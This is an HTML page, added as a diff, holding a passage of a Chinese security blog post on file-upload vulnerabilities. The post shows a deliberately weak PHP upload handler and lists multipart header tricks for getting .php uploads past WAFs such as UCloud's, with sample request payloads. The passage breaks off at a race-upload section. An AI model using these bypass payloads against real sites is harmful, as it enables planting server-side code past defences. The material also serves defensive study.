@@ -1,0 +1,1020 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="1. 前言本文主要讨论下 文件上传和WAF的功与防。 测试环境均为  nginx/1.10.3 PHP 5.5.34  有些特性和 语言及webserver有关，有问题的地方，欢迎大家指正。 2. 文件上传的特征先来了解下文件上传的特征，抓包看看这段文件上传代码的HTTP请求。 upload.php 1234567891011121314151617181920&amp;lt;?phpif(isset($">
+<meta name="keywords" content="Web安全，移动安全，windows安全，漏洞挖掘，代码审计，智能合约">
+<meta property="og:type" content="article">
+<meta property="og:title" content="上传漏洞">
+<meta property="og:url" content="https://wh0ale.github.io/2019/01/13/2019-1-13-上传漏洞/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="1. 前言本文主要讨论下 文件上传和WAF的功与防。 测试环境均为  nginx/1.10.3 PHP 5.5.34  有些特性和 语言及webserver有关，有问题的地方，欢迎大家指正。 2. 文件上传的特征先来了解下文件上传的特征，抓包看看这段文件上传代码的HTTP请求。 upload.php 1234567891011121314151617181920&amp;lt;?phpif(isset($">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.234Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="上传漏洞">
+<meta name="twitter:description" content="1. 前言本文主要讨论下 文件上传和WAF的功与防。 测试环境均为  nginx/1.10.3 PHP 5.5.34  有些特性和 语言及webserver有关，有问题的地方，欢迎大家指正。 2. 文件上传的特征先来了解下文件上传的特征，抓包看看这段文件上传代码的HTTP请求。 upload.php 1234567891011121314151617181920&amp;lt;?phpif(isset($">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/01/13/2019-1-13-上传漏洞/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>上传漏洞 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/01/13/2019-1-13-上传漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">上传漏洞
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-13 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-13T00:00:00+08:00">2019-01-13</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">8.5k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">8 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>本文主要讨论下 文件上传和WAF的功与防。</p>
+<p>测试环境均为</p>
+<ul>
+<li>nginx/1.10.3</li>
+<li>PHP 5.5.34</li>
+</ul>
+<p>有些特性和 语言及webserver有关，有问题的地方，欢迎大家指正。</p>
+<h1 id="2-文件上传的特征"><a href="#2-文件上传的特征" class="headerlink" title="2. 文件上传的特征"></a>2. 文件上传的特征</h1><p>先来了解下文件上传的特征，抓包看看这段文件上传代码的HTTP请求。</p>
+<p>upload.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit_x'</span>]))&#123;</span><br><span class="line">    $upfile = $_FILES[<span class="string">'filename'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $tempfile = $_FILES[<span class="string">'filename'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">$ext = trim(get_extension($upfile));</span><br><span class="line"><span class="comment">// 判断文件后缀是否为数组里的值</span></span><br><span class="line">    <span class="keyword">if</span>(in_array($ext,<span class="keyword">array</span>(<span class="string">'xxx'</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Warning! File type error..'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">$savefile = <span class="string">'upload/'</span> . $upfile;</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($tempfile, $savefile))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Upload success! FileName: '</span>.$savefile);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Upload failed..'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取文件后缀名，并转为小写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_extension</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strtolower(substr($file, strrpos($file, <span class="string">'.'</span>)+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span></span></span><br><span class="line"><span class="tag"><span class="attr">action</span>=<span class="string">"#"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span></span></span><br><span class="line"><span class="tag"><span class="attr">name</span>=<span class="string">"file_x"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span></span></span><br><span class="line"><span class="tag"><span class="attr">name</span>=<span class="string">"submit_x"</span> <span class="attr">value</span>=<span class="string">"upload"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line"> Host: localhost</span><br><span class="line"> Content-Length: 274</span><br><span class="line"> Cache-Control: max-age=0</span><br><span class="line"> Origin: &lt;http://localhost&gt;</span><br><span class="line"> Upgrade-Insecure-Requests: 1</span><br><span class="line"> Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuKS18BporicXJfTx</span><br><span class="line"> User-Agent: Mozilla/5.0</span><br><span class="line"> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"> Accept-Encoding: gzip, deflate, br</span><br><span class="line"> Accept-Language: zh-CN,zh;q=0.8,de;q=0.6,en;q=0.4,fr;q=0.2</span><br><span class="line"> Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryuKS18BporicXJfTx</span><br><span class="line"> Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line"> ------WebKitFormBoundaryuKS18BporicXJfTx</span><br><span class="line"> Content-Disposition: form-data; name=&quot;submit_x&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line"> ------WebKitFormBoundaryuKS18BporicXJfTx--</span><br></pre></td></tr></table></figure>
+
+<p>从中获取特征为：</p>
+<ul>
+<li>请求Header中Content-Type存在以下特征：</li>
+<li>multipart/form-data（表示该请求是一个文件上传请求）</li>
+<li>存在boundary字符串（作用为分隔符，以区分POST数据）</li>
+<li>POST的内容存在以下特征：</li>
+<li>Content-Disposition</li>
+<li>name</li>
+<li>filename</li>
+<li>POST中的boundary的值就是Content-Type的值在最前面加了两个--，除了最后标识结束的boundary</li>
+<li>最后标识结束的boundary最后默认会多出两个--（测试时，最后一行的boundary删掉也能成功上传）</li>
+</ul>
+<h1 id="3-WAF如何拦截"><a href="#3-WAF如何拦截" class="headerlink" title="3. WAF如何拦截"></a>3. WAF如何拦截</h1><p>先来想想，如果自己写WAF来防御恶意文件上传。你应该如何防御？</p>
+<ul>
+<li>文件名</li>
+<li>解析文件名，判断是否在黑名单内。</li>
+<li>文件内容</li>
+<li>解析文件内容，判断是否为webshell。</li>
+<li>文件目录权限</li>
+<li>该功能需要主机WAF实现，比如我见过的云锁。</li>
+</ul>
+<p>目前，市面上常见的是解析文件名，少数WAF是解析文件内容，比如长亭。下面内容，都是基于文件名解析。</p>
+<p>大致步骤如下：</p>
+<ol>
+<li>获取Request Header里的Content-Type值中获取boundary值</li>
+<li>根据第一步的boundary值，解析POST数据，获取文件名</li>
+<li>判断文件名是否在拦截黑名单内</li>
+</ol>
+<p>看看春哥写的<a href="https://github.com/agentzh/lua-resty-multipart-parser/blob/master/lib/resty/multipart/parser.lua" target="_blank" rel="noopener">lua-resty-multipart-parser</a>，就能理解了，不过这份代码已经没维护了。但是这份代码解析了文件名，只是绕过方式比较多233。看到这份解析代码是由于某个WAF使用的这份代码，具体这WAF叫什么名字，现在找不到了，不过github上搜下应该就出来了。</p>
+<p><a href="https://github.com/openresty/lua-resty-upload" target="_blank" rel="noopener">lua-resty-upload</a>这份代码还在维护，不过只是取了内容，文件名需要自己解析。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line"> Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br><span class="line"> Content-Type: text/javascript</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line"> ------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line"> Content-Disposition: form-data; name=&quot;submit_x&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line"> ------WebKitFormBoundaryj1oRYFW91eaj8Ex2--</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-绕过"><a href="#4-绕过" class="headerlink" title="4. 绕过"></a>4. 绕过</h1><p>获取文件名的地方在Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;和Content-Type里，所以绕过的地方也就在这两个地方了。</p>
+<h2 id="4-1-去掉引号"><a href="#4-1-去掉引号" class="headerlink" title="4.1 去掉引号"></a>4.1 去掉引号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=file_x; filename=&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: form-data; name=file_x; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=xx.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-2-双引号变成单引号"><a href="#4-2-双引号变成单引号" class="headerlink" title="4.2 双引号变成单引号"></a>4.2 双引号变成单引号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&apos;file_x&apos;; filename=&apos;xx.php&apos;</span><br></pre></td></tr></table></figure>
+
+<p>单引号、双引号、不要引号，都能上传。</p>
+<h2 id="4-3-大小写"><a href="#4-3-大小写" class="headerlink" title="4.3 大小写"></a>4.3 大小写</h2><p>对这三个固定的字符串进行大小写转换</p>
+<ul>
+<li>Content-Disposition</li>
+<li>name</li>
+<li>filename</li>
+</ul>
+<p>比如name转换成Name，Content-Disposition转换成content-disposition。两年前，拿它绕过安全狗的上传，不知道现在如何。</p>
+<h2 id="4-4-空格"><a href="#4-4-空格" class="headerlink" title="4.4 空格"></a>4.4 空格</h2><p>Content-Disposition: form-data; name=file_x; filename=xx.php</p>
+<p>在: ; =添加1个或者多个空格，不过测试只有filename在=前面添加空格，上传失败。</p>
+<p>在filename=后面添加空格，截止到2017年10月04日还能绕过某盾WAF。</p>
+<h2 id="4-5-去掉或修改Content-Disposition值"><a href="#4-5-去掉或修改Content-Disposition值" class="headerlink" title="4.5 去掉或修改Content-Disposition值"></a>4.5 去掉或修改Content-Disposition值</h2><p>有的WAF在解析的时候，认为Content-Disposition值一定是form-data，造成绕过。两年前，拿它绕过安全狗的上传，不知道现在如何。</p>
+<p>Content-Disposition: name=&#39;file_x&#39;; filename=&#39;xx.php&#39;</p>
+<h2 id="4-6-交换name和filename的顺序"><a href="#4-6-交换name和filename的顺序" class="headerlink" title="4.6 交换name和filename的顺序"></a>4.6 交换name和filename的顺序</h2><p>规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。</p>
+<p>有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; filename=&quot;xx.php&quot;; name=file_x</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-7-多个boundary"><a href="#4-7-多个boundary" class="headerlink" title="4.7 多个boundary"></a>4.7 多个boundary</h2><p>最后上传的文件是test.php而非test.txt，但是取的文件名只取了第一个就会被Bypass。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line"> Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;</span><br><span class="line"> Content-Type: text/javascript</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line"> ------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line"> Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.php&quot;</span><br><span class="line"> Content-Type: text/javascript</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line"> ------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line"> Content-Disposition: form-data; name=&quot;submit_x&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line"> ------WebKitFormBoundaryj1oRYFW91eaj8Ex2--</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-8-多个filename"><a href="#4-8-多个filename" class="headerlink" title="4.8 多个filename"></a>4.8 多个filename</h2><p>最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-9-多个分号"><a href="#4-9-多个分号" class="headerlink" title="4.9 多个分号"></a>4.9 多个分号</h2><p>文件解析时，可能解析不到文件名，导致绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;;;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-10-multipart-form-DATA"><a href="#4-10-multipart-form-DATA" class="headerlink" title="4.10 multipart/form-DATA"></a>4.10 multipart/form-DATA</h2><p>这种绕过应该很少，大多数都会忽略大小写。php和java都支持。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-DATA</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-11-Header在boundary前添加任意字符"><a href="#4-11-Header在boundary前添加任意字符" class="headerlink" title="4.11 Header在boundary前添加任意字符"></a>4.11 Header在boundary前添加任意字符</h2><p>这个只能说，PHP很皮，这都支持。试了JAVA会报错。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-12-filename换行"><a href="#4-12-filename换行" class="headerlink" title="4.12 filename换行"></a>4.12 filename换行</h2><p>PHP支持，Java不支持。截止到2017年10月18日，这个方法能绕过某盾。</p>
+<p>Content-Disposition: form-data; name=&quot;file_x&quot;; file<br> name=&quot;test.php&quot;</p>
+<p>这种PHP也支持。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fi</span><br><span class="line"> lename</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-13-name和filename添加任意字符串"><a href="#4-13-name和filename添加任意字符串" class="headerlink" title="4.13 name和filename添加任意字符串"></a>4.13 name和filename添加任意字符串</h2><p>PHP上传成功，Java上传失败。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name=&quot;file_x&quot;; bypass waf upload; filename=&quot;test.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-14-其他"><a href="#4-14-其他" class="headerlink" title="4.14 其他"></a>4.14 其他</h2><p>其他利用系统特性的就不描述了，不是本文重点。有兴趣可以看下<a href="https://www.jiwo.org/ken/detail.php?id=716" target="_blank" rel="noopener">我的Waf Bypass之道（upload篇）</a></p>
+<h1 id="5-案例绕过"><a href="#5-案例绕过" class="headerlink" title="5. 案例绕过"></a>5. 案例绕过</h1><h3 id="5-1-某盾"><a href="#5-1-某盾" class="headerlink" title="5.1 某盾"></a>5.1 某盾</h3><p>测试某盾WAF对恶意文件上传的拦截。方法比较粗暴，判断如下：</p>
+<ol>
+<li>判断POST数据是否存在Content-Disposition:字符串</li>
+<li>判断filename的文件名是否在黑名单内</li>
+</ol>
+<p>两者满足就拦截，没有做其他多余的判断，正则也很好写。</p>
+<p>测试：curl -v -d &quot;Content-Disposition:filename=xx.php;&quot; <a href="http://www.victim.com" target="_blank" rel="noopener">www.victim.com</a> 拦截</p>
+<p>这种方式确实有误拦截情况。不过截止到2017年10月04日，某盾的上传还是能够通过在filename=后面添加空格进行绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POC：Content-Disposition: form-data; name=&quot;file_x&quot;; filename= &quot;xx.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>下面这种也能绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; file</span><br><span class="line"> name=&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-UCloud"><a href="#5-2-UCloud" class="headerlink" title="5.2 UCloud"></a>5.2 UCloud</h3><p>先找一个用了UCloud WAF的网站测试。</p>
+<p>拦截</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;;filename=&quot;xx.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>去掉form-data绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition:  name=&quot;file_x&quot;;filename=&quot;xx.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>其他的就不测试了…</p>
+<h3 id="5-3-竞争上传"><a href="#5-3-竞争上传" class="headerlink" title="5.3 竞争上传"></a>5.3 竞争上传</h3><p>演示代码：</p>
